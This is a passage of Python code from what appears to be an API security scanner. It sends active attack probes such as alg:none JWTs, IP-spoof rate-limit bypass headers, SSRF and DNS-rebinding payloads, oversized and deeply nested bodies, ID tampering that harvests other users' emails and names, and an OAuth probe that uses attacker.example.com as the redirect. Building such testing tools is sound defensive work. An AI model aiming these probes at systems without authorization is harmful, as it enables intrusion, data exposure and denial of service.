        # Get authenticated baseline
        auth_hdrs = self._get_auth_headers()
        baseline_resp, _ = self._send(method, url, headers=auth_hdrs)
        if baseline_resp is None:
            return

        # Only test endpoints that appear to require auth (200 with auth)
        # or test all endpoints if we don't have auth
        baseline_status = baseline_resp.status_code
        baseline_body_len = len(baseline_resp.content)

        auth_bypass_cases: list[tuple[str, dict]] = [
            # No auth header at all
            ("No auth header", {}),
            # Empty bearer token
            ("Empty Bearer token", {self.auth_header: "Bearer "}),
            # Null/undefined tokens
            ("null token", {self.auth_header: "Bearer null"}),
            ("undefined token", {self.auth_header: "Bearer undefined"}),
            # Expired-looking JWT
            ("Expired JWT", {self.auth_header: f"Bearer {_FAKE_JWT}"}),
            # alg:none JWT
            ("alg:none JWT", {self.auth_header: f"Bearer {_NONE_JWT}"}),
            # Wrong case for header name
            ("Wrong-case header", {self.auth_header.lower(): f"Bearer {self.auth_token or 'test'}"}),
            ("Mixed-case header", {self.auth_header.upper(): f"Bearer {self.auth_token or 'test'}"}),
            # Basic auth instead of Bearer
            ("Basic auth swap", {self.auth_header: f"Basic {base64.b64encode(b'admin:admin').decode()}"}),
            # API key style
            ("API key style", {"X-API-Key": "null"}),
            ("API key empty", {"X-API-Key": ""}),
        ]

        for case_name, test_headers in auth_bypass_cases:
            if self.stop_event.is_set():
                return

            resp, elapsed = self._send(method, url, headers=test_headers)
            if resp is None:
                continue

            # Flag if we get 200 with data when auth should be required
            if resp.status_code == 200 and baseline_status == 200:
                resp_body_len = len(resp.content)
                # Same or similar data without auth = bypass
                if resp_body_len > 50 and abs(resp_body_len - baseline_body_len) < baseline_body_len * 0.3:
                    self._make_finding(
                        url=url, method=method,
                        test_type="Auth Bypass",
                        param=self.auth_header,
                        finding=(
                            f"Endpoint returns similar data ({resp_body_len} bytes) with "
                            f"'{case_name}' as with valid auth ({baseline_body_len} bytes)."
                        ),
                        severity="critical",
                        proof=(
                            f"Case: {case_name}, Status={resp.status_code}, "
                            f"BodyLen={resp_body_len} vs baseline={baseline_body_len}"
                        ),
                        payload=json.dumps(test_headers),
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

            # Endpoint that was 401/403 now returns 200
            if resp.status_code == 200 and baseline_status in (401, 403):
                self._make_finding(
                    url=url, method=method,
                    test_type="Auth Bypass",
                    param=self.auth_header,
                    finding=(
                        f"'{case_name}' bypassed authentication. "
                        f"Baseline returned {baseline_status}, bypass returned 200."
                    ),
                    severity="critical",
                    proof=f"Case: {case_name}, Baseline={baseline_status}, Bypass=200",
                    payload=json.dumps(test_headers),
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 6: Rate Limiting
    # ══════════════════════════════════════════════════════════════════════════

    def _test_rate_limiting(self, surface: InputSurface) -> None:
        """
        Rate limit testing. Send rapid requests to sensitive endpoints.
        Flag absence of rate limiting (no 429 responses).
        """
        url = surface.url
        method = surface.method
        path = urlparse(url).path.lower()

        # Only test sensitive endpoints
        is_sensitive = any(kw in path for kw in _SENSITIVE_PATH_KEYWORDS)
        if not is_sensitive:
            return

        NUM_REQUESTS = 50
        statuses: list[int] = []
        times: list[float] = []
        got_429 = False

        for i in range(NUM_REQUESTS):
            if self.stop_event.is_set():
                return

            body = self._build_body(surface) if method in ("POST", "PUT", "PATCH") else None
            ct = surface.content_type if body else None

            try:
                t0 = time.monotonic()
                resp = self.session.request(
                    method, url,
                    headers=self._get_auth_headers(),
                    json=body if ct and "json" in ct else None,
                    data=body if ct and "json" not in ct else None,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
            except Exception:
                continue

            statuses.append(resp.status_code)
            times.append(elapsed)

            if resp.status_code == 429:
                got_429 = True
                break  # Rate limiting is working

            # Don't apply rate_limit here -- the whole point is rapid requests
            # But tiny sleep to avoid kernel socket exhaustion
            time.sleep(0.005)

        if not statuses:
            return

        if got_429:
            self._test_rate_limit_bypass(url, method)
            return

        if len(statuses) >= 40:
            # Check for response time drift (soft rate limiting)
            if len(times) >= 10:
                early_avg = sum(times[:5]) / 5
                late_avg = sum(times[-5:]) / 5
                time_drift = late_avg - early_avg

                # Significant slowdown might indicate throttling
                if time_drift > early_avg * 2:
                    self._make_finding(
                        url=url, method=method,
                        test_type="Rate Limiting",
                        param="(endpoint)",
                        finding=(
                            f"Possible soft rate limiting: response time increased from "
                            f"{early_avg:.0f}ms to {late_avg:.0f}ms over {len(statuses)} requests."
                        ),
                        severity="low",
                        proof=f"Time drift: +{time_drift:.0f}ms over {len(statuses)} requests",
                        payload=f"{len(statuses)} rapid requests",
                        status_code=statuses[-1],
                        response_time_ms=late_avg,
                    )
                    return

            # No rate limiting detected at all
            success_count = sum(1 for s in statuses if s in (200, 201, 202, 204))
            self._make_finding(
                url=url, method=method,
                test_type="Rate Limiting",
                param="(endpoint)",
                finding=(
                    f"No rate limiting detected after {len(statuses)} rapid requests. "
                    f"{success_count} returned success status. Sensitive endpoint at risk for brute-force."
                ),
                severity="medium",
                proof=(
                    f"Sent {len(statuses)} requests, {success_count} success, "
                    f"0 rate-limited (429). Statuses: {dict(Counter(statuses))}"
                ),
                payload=f"{len(statuses)} rapid requests with no delay",
                status_code=statuses[-1] if statuses else 0,
                response_time_ms=sum(times) / len(times) if times else 0,
            )

    def _test_rate_limit_bypass(self, url: str, method: str) -> None:
        """Try IP-spoof headers to bypass a confirmed 429 rate limit."""
        body = {"test": "bypass"}
        auth_hdrs = self._get_auth_headers()
        for header_name in _RATE_LIMIT_BYPASS_HEADERS:
            for ip in _BYPASS_IPS:
                if self.stop_event.is_set():
                    return
                try:
                    t0 = time.monotonic()
                    resp = self.session.request(
                        method, url,
                        headers={**auth_hdrs, header_name: ip},
                        json=body if method in ("POST", "PUT", "PATCH") else None,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False,
                    )
                    elapsed = (time.monotonic() - t0) * 1000
                    if resp.status_code != 429:
                        self._make_finding(
                            url=url, method=method,
                            test_type="Rate Limit Bypass",
                            param=header_name,
                            finding=(
                                f"Rate limit bypassed via {header_name}: {ip!r} — "
                                f"got {resp.status_code} instead of 429"
                            ),
                            severity="high",
                            proof=f"{header_name}: {ip} → HTTP {resp.status_code}",
                            payload=f"{header_name}: {ip}",
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                        )
                        return
                except Exception:
                    pass

    def _test_webhook_ssrf(self, base_url: str) -> None:
        """POST SSRF payloads to common webhook registration endpoints."""
        if not base_url:
            return
        base = base_url.rstrip("/")
        auth_hdrs = self._get_auth_headers()
        for path in _WEBHOOK_REGISTRATION_PATHS:
            if self.stop_event.is_set():
                return
            url = base + path
            found = False
            for payload in _WEBHOOK_SSRF_PAYLOADS:
                if found:
                    break
                for body_key in ("url", "callback_url"):
                    try:
                        t0 = time.monotonic()
                        resp = self.session.post(
                            url,
                            json={body_key: payload},
                            headers={**auth_hdrs, "Content-Type": "application/json"},
                            timeout=self.timeout,
                            verify=False,
                            allow_redirects=False,
                        )
                        elapsed = (time.monotonic() - t0) * 1000
                        if 200 <= resp.status_code < 300:
                            self._make_finding(
                                url=url, method="POST",
                                test_type="Webhook SSRF Registration",
                                param=body_key,
                                finding=(
                                    f"Webhook registration at {path} accepted SSRF payload "
                                    f"— server may fetch attacker-controlled URL"
                                ),
                                severity="high",
                                proof=f"POST {url} {body_key}={payload!r} → {resp.status_code}",
                                payload=payload,
                                status_code=resp.status_code,
                                response_time_ms=elapsed,
                            )
                            found = True
                            break
                    except Exception:
                        pass

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 7: TYPE JUGGLING
    # ══════════════════════════════════════════════════════════════════════════

    def _test_type_juggling(self, surface: InputSurface) -> None:
        """
        Type Juggling / Type Confusion testing.
        Send type-juggled variants of parameters to detect parser differentials.
        """
        if self.stop_event.is_set():
            return

        url = surface.url
        method = surface.method
        body = self._build_body(surface)
        if not body:
            return

        # Get baseline response
        baseline_resp, baseline_time = self._send(
            method, url, headers=self._get_auth_headers(),
            body=body, content_type="application/json",
        )
        if baseline_resp is None:
            return

        baseline_status = baseline_resp.status_code
        baseline_len = len(baseline_resp.content)

        for param, orig_value in body.items():
            if self.stop_event.is_set():
                return

            # Build type-juggled variants
            variants: list[tuple[str, Any]] = [
                ("boolean_true", True),
                ("boolean_false", False),
                ("null", None),
                ("empty_string", ""),
                ("empty_array", []),
                ("empty_object", {}),
            ]
            # Try integer conversion
            try:
                variants.insert(0, ("integer", int(orig_value)))
            except (ValueError, TypeError):
                variants.insert(0, ("integer", 0))

            for variant_name, variant_value in variants:
                if self.stop_event.is_set():
                    return

                tampered = dict(body)
                tampered[param] = variant_value

                resp, elapsed = self._send(
                    method, url, headers=self._get_auth_headers(),
                    body=tampered, content_type="application/json",
                )
                if resp is None:
                    continue

                resp_status = resp.status_code
                resp_len = len(resp.content)
                len_diff = abs(resp_len - baseline_len)

                # Server error on any variant = parser differential
                if resp_status == 500:
                    self._make_finding(
                        url=url, method=method,
                        test_type="Type Juggling",
                        param=param,
                        finding=(
                            f"Server error (500) when parameter '{param}' sent as "
                            f"{variant_name} ({variant_value!r}). Parser differential vulnerability."
                        ),
                        severity="medium",
                        proof=f"Baseline: {baseline_status}, Variant ({variant_name}): 500",
                        payload=json.dumps(tampered),
                        status_code=resp_status,
                        response_time_ms=elapsed,
                    )
                # 200 on null/empty when baseline is 400+ = type confusion bypass
                elif (variant_name in ("null", "empty_string", "empty_array", "empty_object")
                      and resp_status == 200 and baseline_status >= 400):
                    self._make_finding(
                        url=url, method=method,
                        test_type="Type Juggling",
                        param=param,
                        finding=(
                            f"Type confusion bypass: '{param}' as {variant_name} returns 200 "
                            f"while original value returns {baseline_status}."
                        ),
                        severity="medium",
                        proof=(
                            f"Baseline: {baseline_status} ({baseline_len}B), "
                            f"Variant ({variant_name}): {resp_status} ({resp_len}B)"
                        ),
                        payload=json.dumps(tampered),
                        status_code=resp_status,
                        response_time_ms=elapsed,
                    )
                # Significant response difference on same success status
                elif (resp_status != baseline_status
                      or (resp_status == baseline_status and len_diff > baseline_len * 0.5
                          and baseline_len > 100)):
                    self._make_finding(
                        url=url, method=method,
                        test_type="Type Juggling",
                        param=param,
                        finding=(
                            f"Different behavior when '{param}' sent as {variant_name}: "
                            f"status {baseline_status}->{resp_status}, "
                            f"size {baseline_len}B->{resp_len}B."
                        ),
                        severity="low",
                        proof=(
                            f"Baseline: {baseline_status} ({baseline_len}B), "
                            f"Variant ({variant_name}): {resp_status} ({resp_len}B)"
                        ),
                        payload=json.dumps(tampered),
                        status_code=resp_status,
                        response_time_ms=elapsed,
                    )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 8: OVERSIZED PAYLOAD
    # ══════════════════════════════════════════════════════════════════════════

    def _test_oversized_payload(self, surface: InputSurface) -> None:
        """
        Oversized Payload testing.
        Send extremely large, deeply nested, or high-cardinality payloads to detect
        missing input size validation and potential denial-of-service vectors.
        """
        if self.stop_event.is_set():
            return

        method = surface.method
        if method not in ("POST", "PUT", "PATCH"):
            return

        url = surface.url

        # Build payloads: (label, body)
        test_payloads: list[tuple[str, Any]] = []

        # 1. Large string value (1MB)
        body = self._build_body(surface)
        if body:
            large_body = dict(body)
            first_param = next(iter(large_body))
            large_body[first_param] = "A" * 1_000_000
            test_payloads.append(("large_string_1MB", large_body))

        # 2. Deeply nested JSON (200 levels)
        nested: Any = {"value": "deep"}
        for _ in range(200):
            nested = {"a": nested}
        test_payloads.append(("deeply_nested_200", nested))

        # 3. Large array (100k elements)
        test_payloads.append(("large_array_100k", {"data": [0] * 100_000}))

        for label, payload in test_payloads:
            if self.stop_event.is_set():
                return

            resp, elapsed = self._send(
                method, url, headers=self._get_auth_headers(),
                body=payload, content_type="application/json",
            )
            if resp is None:
                continue

            status = resp.status_code

            if status == 500:
                self._make_finding(
                    url=url, method=method,
                    test_type="Oversized Payload",
                    param=f"({label})",
                    finding=(
                        f"Server crash (500) on oversized input ({label}). "
                        f"Potential denial-of-service vector."
                    ),
                    severity="medium",
                    proof=f"Sent {label} payload, got 500 in {elapsed:.0f}ms",
                    payload=f"[{label} — too large to display]",
                    status_code=status,
                    response_time_ms=elapsed,
                )
            elif status == 200:
                self._make_finding(
                    url=url, method=method,
                    test_type="Oversized Payload",
                    param=f"({label})",
                    finding=(
                        f"No payload size limit: server accepted {label} with 200 OK. "
                        f"Expected 413 or 400."
                    ),
                    severity="medium",
                    proof=f"Sent {label} payload, got 200 in {elapsed:.0f}ms",
                    payload=f"[{label} — too large to display]",
                    status_code=status,
                    response_time_ms=elapsed,
                )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 9: HORIZONTAL PRIVILEGE ESCALATION
    # ══════════════════════════════════════════════════════════════════════════

    _EMAIL_RE = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
    _NAME_RE = re.compile(
        r'"(?:name|full_name|fullName|username|user_name|display_name|displayName)"\s*:\s*"([^"]+)"'
    )

    def _test_horizontal_privesc(self, surface: InputSurface) -> None:
        """
        Horizontal Privilege Escalation testing.
        Detect when manipulating ID parameters returns a different user's data.
        """
        if self.stop_event.is_set():
            return

        url = surface.url
        method = surface.method

        # Find ID-like parameters in path segments
        parsed = urlparse(url)
        path_segments = parsed.path.split("/")
        id_positions: list[int] = []
        for i, seg in enumerate(path_segments):
            if seg.isdigit() or (len(seg) == 36 and "-" in seg):
                id_positions.append(i)

        has_id_param = self._is_id_param(surface.param)

        if not id_positions and not has_id_param:
            return

        # Get baseline response with original IDs
        baseline_resp, baseline_time = self._send(
            method, url, headers=self._get_auth_headers(),
        )
        if baseline_resp is None:
            return

        baseline_status = baseline_resp.status_code
        if baseline_status >= 400:
            return

        baseline_text = baseline_resp.text[:5000]
        baseline_emails = set(self._EMAIL_RE.findall(baseline_text))
        baseline_names = set(self._NAME_RE.findall(baseline_text))

        if not baseline_emails and not baseline_names:
            return  # No PII to compare against

        # Try manipulated IDs via path segments
        tamper_values = []
        for pos in id_positions:
            orig = path_segments[pos]
            if orig.isdigit():
                orig_int = int(orig)
                replacements = [str(orig_int + 1), str(orig_int - 1), "0", "99999"]
            else:
                replacements = [
                    str(uuid.uuid4()),
                    "00000000-0000-0000-0000-000000000000",
                    "0", "99999",
                ]
            for repl in replacements:
                segs = list(path_segments)
                segs[pos] = repl
                tampered_path = "/".join(segs)
                tampered_url = parsed._replace(path=tampered_path).geturl()
                tamper_values.append((pos, orig, repl, tampered_url))

        for pos, orig, repl, tampered_url in tamper_values:
            if self.stop_event.is_set():
                return

            resp, elapsed = self._send(
                method, tampered_url, headers=self._get_auth_headers(),
            )
            if resp is None:
                continue

            if resp.status_code >= 400:
                continue

            resp_text = resp.text[:5000]
            resp_emails = set(self._EMAIL_RE.findall(resp_text))
            resp_names = set(self._NAME_RE.findall(resp_text))

            # Check if we got DIFFERENT user data
            new_emails = resp_emails - baseline_emails
            new_names = resp_names - baseline_names

            if new_emails or new_names:
                leaked = []
                if new_emails:
                    leaked.append(f"emails: {', '.join(sorted(new_emails)[:3])}")
                if new_names:
                    leaked.append(f"names: {', '.join(sorted(new_names)[:3])}")

                self._make_finding(
                    url=url, method=method,
                    test_type="Horizontal Privilege Escalation",
                    param=f"path[{pos}]",
                    finding=(
                        f"Horizontal privilege escalation confirmed: changing ID "
                        f"'{orig}' to '{repl}' returned different user data. "
                        f"Leaked {'; '.join(leaked)}."
                    ),
                    severity="critical",
                    proof=(
                        f"Original ID {orig}: emails={sorted(baseline_emails)[:2]}, "
                        f"names={sorted(baseline_names)[:2]}. "
                        f"Tampered ID {repl}: new {'; '.join(leaked)}"
                    ),
                    payload=tampered_url,
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

        # Also test via body/query param if it's an ID param
        if has_id_param and surface.original_value:
            orig_val = surface.original_value
            body = self._build_body(surface)
            try:
                orig_int = int(orig_val)
                replacements = [str(orig_int + 1), str(orig_int - 1), "0", "99999"]
            except (ValueError, TypeError):
                replacements = [str(uuid.uuid4()), "0", "99999"]

            for repl in replacements:
                if self.stop_event.is_set():
                    return

                tampered_body = dict(body)
                tampered_body[surface.param] = repl

                resp, elapsed = self._send(
                    method, url, headers=self._get_auth_headers(),
                    body=tampered_body, content_type="application/json",
                )
                if resp is None:
                    continue
                if resp.status_code >= 400:
                    continue

                resp_text = resp.text[:5000]
                resp_emails = set(self._EMAIL_RE.findall(resp_text))
                resp_names = set(self._NAME_RE.findall(resp_text))

                new_emails = resp_emails - baseline_emails
                new_names = resp_names - baseline_names

                if new_emails or new_names:
                    leaked = []
                    if new_emails:
                        leaked.append(f"emails: {', '.join(sorted(new_emails)[:3])}")
                    if new_names:
                        leaked.append(f"names: {', '.join(sorted(new_names)[:3])}")

                    self._make_finding(
                        url=url, method=method,
                        test_type="Horizontal Privilege Escalation",
                        param=surface.param,
                        finding=(
                            f"Horizontal privilege escalation confirmed: changing "
                            f"'{surface.param}' from '{orig_val}' to '{repl}' returned "
                            f"different user data. Leaked {'; '.join(leaked)}."
                        ),
                        severity="critical",
                        proof=(
                            f"Original {surface.param}={orig_val}: "
                            f"emails={sorted(baseline_emails)[:2]}, "
                            f"names={sorted(baseline_names)[:2]}. "
                            f"Tampered {surface.param}={repl}: new {'; '.join(leaked)}"
                        ),
                        payload=json.dumps(tampered_body),
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                    break  # One confirmed finding per param is enough

    def _test_idor_id_prediction(self, surface: InputSurface) -> None:
        """Sequential ID enumeration: probe a range around the observed ID to find IDOR."""
        if not self._is_id_param(surface.param):
            return
        try:
            base_id = int(surface.original_value or "0")
        except (ValueError, TypeError):
            return
        if base_id <= 0:
            return

        baseline_resp, _ = self._send(surface.method, surface.url,
                                       headers=self._get_auth_headers())
        if baseline_resp is None or baseline_resp.status_code not in (200, 201):
            return
        baseline_body = baseline_resp.text[:4000]

        probe_ids = list(range(max(1, base_id - 5), base_id)) + list(range(base_id + 1, base_id + 6))
        for probe_id in probe_ids:
            if self.stop_event.is_set():
                return
            probed_url = self._replace_param_value(surface, str(probe_id))
            resp, elapsed = self._send(surface.method, probed_url,
                                        headers=self._get_auth_headers())
            if resp is None or resp.status_code not in (200, 201):
                continue
            if resp.text[:4000] != baseline_body and len(resp.text) > 50:
                self._make_finding(
                    url=probed_url,
                    method=surface.method,
                    test_type="idor_sequential_id",
                    param=surface.param,
                    severity="high",
                    finding=(
                        f"Sequential ID enumeration: probing {surface.param}={probe_id} "
                        f"returned a different object (status {resp.status_code})"
                    ),
                    proof=f"Probe ID {probe_id} → {len(resp.text)}B response vs baseline {len(baseline_body)}B",
                    payload=str(probe_id),
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )
                return  # one finding per surface is sufficient

    def _replace_param_value(self, surface: InputSurface, new_value: str) -> str:
        parsed = urlparse(surface.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[surface.param] = [new_value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))

    def _test_pagination_abuse(self, surface: InputSurface) -> None:
        if surface.param not in _PAGINATION_PARAMS:
            return

        method = surface.method
        url = surface.url
        auth_hdrs = self._get_auth_headers()

        baseline_resp, _ = self._send(method, url, headers=auth_hdrs)
        if baseline_resp is None or baseline_resp.status_code >= 400:
            return
        baseline_len = len(baseline_resp.text)

        for param_name, abuse_value in _PAGINATION_ABUSE_VALUES:
            if self.stop_event.is_set():
                return
            if surface.param != param_name:
                continue

            abuse_url = self._replace_param_value(surface, abuse_value)

            try:
                t0 = time.monotonic()
                resp = self.session.get(
                    abuse_url, headers=auth_hdrs,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
            except Exception:
                continue

            if resp.status_code >= 400:
                continue

            resp_len = len(resp.text)

            if abuse_value == "999999999" and resp_len > max(baseline_len * 3, 50000):
                self._make_finding(
                    url=abuse_url, method="GET",
                    test_type="pagination_abuse_dos",
                    param=param_name,
                    finding=(
                        f"Pagination abuse potential DoS: {param_name}={abuse_value} "
                        f"returned {resp_len} bytes (baseline {baseline_len} bytes, "
                        f"{resp_len // max(baseline_len, 1)}x larger). "
                        f"Unrestricted pagination may exhaust server resources."
                    ),
                    severity="high",
                    proof=f"GET {abuse_url} → {resp.status_code} | body={resp_len}B vs baseline={baseline_len}B",
                    payload=f"{param_name}={abuse_value}",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )
            elif abuse_value == "-1" and resp_len > 0 and resp.text[:200] != baseline_resp.text[:200]:
                self._make_finding(
                    url=abuse_url, method="GET",
                    test_type="pagination_enumeration",
                    param=param_name,
                    finding=(
                        f"Negative {param_name} accepted — server responded with different "
                        f"content for {param_name}={abuse_value}. May expose records outside "
                        f"expected page range."
                    ),
                    severity="medium",
                    proof=f"GET {abuse_url} → {resp.status_code} | body differs from baseline",
                    payload=f"{param_name}={abuse_value}",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

    def _test_endpoint_enumeration(self, base_url: str) -> None:
        if not base_url:
            return
        base = base_url.rstrip("/")
        auth_hdrs = self._get_auth_headers()

        for path in _HIDDEN_ENDPOINTS:
            if self.stop_event.is_set():
                return
            url = base + path
            if self.scope and not self.scope.in_scope(url):
                continue
            try:
                t0 = time.monotonic()
                resp = self.session.get(
                    url, headers=auth_hdrs, timeout=self.timeout,
                    verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
                if 200 <= resp.status_code < 300 and len(resp.text) > 50:
                    self._make_finding(
                        url=url, method="GET",
                        test_type="hidden_endpoint",
                        param="path",
                        finding=(
                            f"Hidden endpoint discovered: {path} returned HTTP {resp.status_code}. "
                            f"Endpoint not in documented API surface — may expose admin, debug, "
                            f"or internal functionality."
                        ),
                        severity="high",
                        proof=f"GET {url} → {resp.status_code} | body={len(resp.text)}B",
                        payload=path,
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
            except Exception:
                pass

    def _test_pkce_downgrade(self, base_url: str) -> None:
        if not base_url:
            return
        base = base_url.rstrip("/")
        auth_hdrs = self._get_auth_headers()

        for path in _OAUTH_AUTHORIZE_PATTERNS:
            if self.stop_event.is_set():
                return
            url = base + path
            if self.scope and not self.scope.in_scope(url):
                continue
            try:
                # Probe without code_challenge — a PKCE-enforcing server must reject this
                params = {
                    "client_id":     "test_client",
                    "response_type": "code",
                    "redirect_uri":  "https://attacker.example.com/callback",
                    "state":         uuid.uuid4().hex,
                }
                t0 = time.monotonic()
                resp = self.session.get(
                    url, params=params, headers=auth_hdrs,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
                if resp.status_code in (200, 302):
                    self._make_finding(
                        url=url, method="GET",
                        test_type="pkce_downgrade",
                        param="code_challenge",
                        finding=(
                            f"OAuth /authorize endpoint at {path} accepted request without "
                            f"code_challenge parameter (PKCE not enforced). "
                            f"Enables authorization code interception attacks."
                        ),
                        severity="high",
                        proof=f"GET {url}?client_id=test_client&response_type=code → {resp.status_code} (no code_challenge)",
                        payload="code_challenge omitted",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
            except Exception:
                pass

    def _test_bearer_substitution(self, base_url: str) -> None:
        """
        Test two OAuth2 bearer token vulnerabilities:
        1. Missing `aud` claim — token not audience-bound, usable on any resource server
        2. Bearer substitution — token valid for user-tier endpoints accepted on admin-tier paths
        """
        if not self.auth_token or not base_url:
            return

        # Check JWT audience binding
        try:
            import base64 as _b64
            parts = self.auth_token.split(".")
            if len(parts) == 3:
                payload_b64 = parts[1] + "=="  # re-pad
                payload_json = _b64.urlsafe_b64decode(payload_b64).decode("utf-8", errors="replace")
                claims = json.loads(payload_json)
                if "aud" not in claims:
                    self._make_finding(
                        url=base_url, method="GET",
                        test_type="bearer_no_audience",
                        param="Authorization",
                        finding=(
                            "JWT bearer token has no `aud` (audience) claim — "
                            "token is not bound to a specific resource server "
                            "and may be accepted by any service that trusts the issuer"
                        ),
                        severity="medium",
                        proof=f"JWT payload claims: {list(claims.keys())} — 'aud' absent",
                        payload=self.auth_token[:40] + "...",
                        status_code=0,
                        response_time_ms=0.0,
                    )
        except Exception:
            pass

        # Active probe: try current bearer token against cross-tier endpoints
        base = base_url.rstrip("/")
        auth_hdrs = self._get_auth_headers()
        for path_prefix in _BEARER_CROSS_TIER_PATHS:
            if self.stop_event.is_set():
                return
            probe_url = base + path_prefix
            if self.scope and not self.scope.in_scope(probe_url):
                continue
            try:
                t0 = time.monotonic()
                resp = self.session.get(
                    probe_url, headers=auth_hdrs,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
                if resp.status_code == 200:
                    self._make_finding(
                        url=probe_url, method="GET",
                        test_type="bearer_substitution",
                        param="Authorization",
                        finding=(
                            f"Bearer token substitution — user-tier token accepted at "
                            f"privileged path '{path_prefix}' (HTTP 200) [{probe_url}]"
                        ),
                        severity="high",
                        proof=f"GET {probe_url} with Bearer token → 200 OK",
                        payload=f"Authorization: Bearer <token> → {path_prefix}",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                    break  # one confirmed substitution is sufficient
            except Exception:
                pass

    def _test_dns_rebinding_ssrf(self, surface: InputSurface) -> None:
        if surface.param not in _SSRF_URL_PARAMS:
            return

        method = surface.method
        url = surface.url
        auth_hdrs = self._get_auth_headers()
        parsed = urlparse(url)

        for payload in _DNS_REBINDING_PAYLOADS:
            if self.stop_event.is_set():
                return
            try:
                if surface.param_type == "query":
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[surface.param] = [payload]
                    probe_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                    t0 = time.monotonic()
                    resp = self.session.get(
                        probe_url, headers=auth_hdrs, timeout=self.timeout,
                        verify=False, allow_redirects=False,
                    )
                    elapsed = (time.monotonic() - t0) * 1000
                elif surface.param_type in ("form", "json"):
                    body = {surface.param: payload}
                    t0 = time.monotonic()
                    resp = self.session.request(
                        method, url, json=body, headers=auth_hdrs,
                        timeout=self.timeout, verify=False, allow_redirects=False,
                    )
                    probe_url = url
                    elapsed = (time.monotonic() - t0) * 1000
                else:
                    continue

                if resp.status_code == 200 and _INTERNAL_BODY_RE.search(resp.text[:2000]):
                    self._make_finding(
                        url=probe_url, method=method,
                        test_type="ssrf_dns_rebinding",
                        param=surface.param,
                        finding=(
                            f"Potential SSRF via DNS rebinding — parameter '{surface.param}' "
                            f"with payload {payload!r} returned internal address indicators "
                            f"in response body."
                        ),
                        severity="critical",
                        proof=f"{method} {probe_url} payload={payload!r} → {resp.status_code} | body contains internal indicators",
                        payload=payload,
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                    break
            except Exception:
                pass

    def _test_third_party_api_injection(self, surface: InputSurface) -> None:
        if not surface.original_value:
            return
        original = surface.original_value

        matched = next(
            (d for d in _THIRD_PARTY_INDICATORS if d in original),
            None,
        )
        if not matched:
            return

        injected_url = original.replace(matched, "127.0.0.1")
        method = surface.method
        url = surface.url
        auth_hdrs = self._get_auth_headers()

        try:
            parsed = urlparse(url)
            if surface.param_type == "query":
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[surface.param] = [injected_url]
                probe_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
                t0 = time.monotonic()
                resp = self.session.get(
                    probe_url, headers=auth_hdrs, timeout=self.timeout,
                    verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
            else:
                body = {surface.param: injected_url}
                t0 = time.monotonic()
                resp = self.session.request(
                    method, url, json=body, headers=auth_hdrs,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                probe_url = url
                elapsed = (time.monotonic() - t0) * 1000

            if resp.status_code == 200:
                self._make_finding(
                    url=probe_url, method=method,
                    test_type="third_party_api_injection",
                    param=surface.param,
                    finding=(
                        f"Third-party API injection: parameter '{surface.param}' originally "
                        f"points to '{matched}'; replacing with '127.0.0.1' returned 200. "
                        f"Server may proxy requests to attacker-controlled endpoints."
                    ),
                    severity="high",
                    proof=f"{method} {probe_url} → {resp.status_code} | injected URL={injected_url!r}",
                    payload=injected_url,
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )
        except Exception:
            pass

    # ── API5: HTTP method override bypass ─────────────────────────────────────

    def _test_method_override(self, surface: InputSurface) -> None:
        """API5: Test X-HTTP-Method-Override and variant headers for verb bypass."""
        url = surface.url
        orig_method = surface.method.upper()
        if orig_method not in ("GET", "POST"):
            return

        baseline, _ = self._send(orig_method, url)
        if baseline is None:
            return
        if baseline.status_code == 404:
            return  # endpoint doesn't exist; no point probing overrides
        baseline_blocked = baseline.status_code in (401, 403, 405)

        for header_name, target_verb in _METHOD_OVERRIDE_HEADERS:
            if self.stop_event.is_set():
                break
            resp, elapsed = self._send(orig_method, url, headers={header_name: target_verb})
            if resp is None:
                continue
            override_ok = resp.status_code in (200, 201, 202, 204)
            if baseline_blocked and override_ok:
                self._make_finding(
                    url=url, method=orig_method,
                    test_type="api5_method_override",
                    param=header_name,
                    finding=(
                        f"HTTP method override accepted: {header_name}: {target_verb} "
                        f"returned HTTP {resp.status_code} where baseline {orig_method} "
                        f"was blocked ({baseline.status_code})"
                    ),
                    severity="high",
                    proof=f"{header_name}: {target_verb} | status={resp.status_code} | body[:200]={resp.text[:200]}",
                    payload=f"{header_name}: {target_verb}",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )
                break

    # ── JWT algorithm confusion ────────────────────────────────────────────────

    def _test_jwt_alg_confusion(self, base_url: str) -> None:
